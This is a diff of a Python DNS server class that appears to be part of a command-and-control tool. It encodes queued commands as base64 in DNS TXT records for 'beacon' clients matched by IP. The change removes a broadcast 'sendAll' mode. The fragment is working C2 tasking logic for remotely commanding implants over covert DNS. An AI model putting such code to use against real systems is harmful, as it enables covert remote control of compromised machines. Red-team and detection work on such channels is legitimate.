@@ -30,7 +30,6 @@ class DNSResponse:
         self.server = server
         self.frag = False               # if the file needs to be fragmented
         self.sendName = False           # if were sending the file name to the beacon
-        self.sendAll = server.sendAll   # send commands to any beacon
         self.chk = chk
 
     """
@@ -90,33 +89,24 @@ class DNSResponse:
                     self.server.fName = None
                     self.curr = 0
             else:
-                if self.sendAll:
-                    full = ';'.join(cmd for cmd in self.commands) # concat commands with semicolon
-                    self.server.log('response', None, 'SENDALL - ' + full)            # log the command being sent
-                    full = base64.b64encode(full)
-                    length = len(full)
-                    self.packet += struct.pack("!H", length + 1) # RDLENGTH(cmd length) + txt length field
-                    self.packet += struct.pack("B", length) # TXT Length(cmd lengths)
-                    self.packet += ''.join(struct.pack("c", x) for x in full) # loop & store command
+                found = None
+                for x in self.beacons:  # look through all the beacons queued up
+                    if self.addr[0] == x.ip:  # beacon was in the list, send its commands
+                        found = x
+                        full = ';'.join(cmd for cmd in x.cmds) # concat commands with semicolon
+                        self.server.log('beacon', x, full)
+                        full = base64.b64encode(full)
+                        length = len(full)
+                        self.packet += struct.pack("!H", length + 1) # RDLENGTH(cmd length) + txt length field
+                        self.packet += struct.pack("B", length) # TXT Length(cmd lengths)
+                        self.packet += ''.join(struct.pack("c", x) for x in full) # loop & store command
+                        
+                if found == None:   # valid beacon wasnt found
+                    self.packet += struct.pack("!H", 1) #RDLENGTH
+                    self.packet += struct.pack("B", 0)  #TXT LENGTH
                 else:
-                    found = None
-                    for x in self.beacons:  # look through all the beacons queued up
-                        if self.addr[0] == x.ip:  # beacon was in the list, send its commands
-                            found = x
-                            full = ';'.join(cmd for cmd in x.cmds) # concat commands with semicolon
-                            self.server.log('beacon', x, full)
-                            full = base64.b64encode(full)
-                            length = len(full)
-                            self.packet += struct.pack("!H", length + 1) # RDLENGTH(cmd length) + txt length field
-                            self.packet += struct.pack("B", length) # TXT Length(cmd lengths)
-                            self.packet += ''.join(struct.pack("c", x) for x in full) # loop & store command
-                            
-                    if found == None:   # valid beacon wasnt found
-                        self.packet += struct.pack("!H", 1) #RDLENGTH
-                        self.packet += struct.pack("B", 0)  #TXT LENGTH
-                    else:
-                        found.cmds = []
-                        self.beacons.remove(found)   # remove beacon from list 
+                    found.cmds = []
+                    self.beacons.remove(found)   # remove beacon from list 
 
         else:   # load IP for A record
             if self.chk:
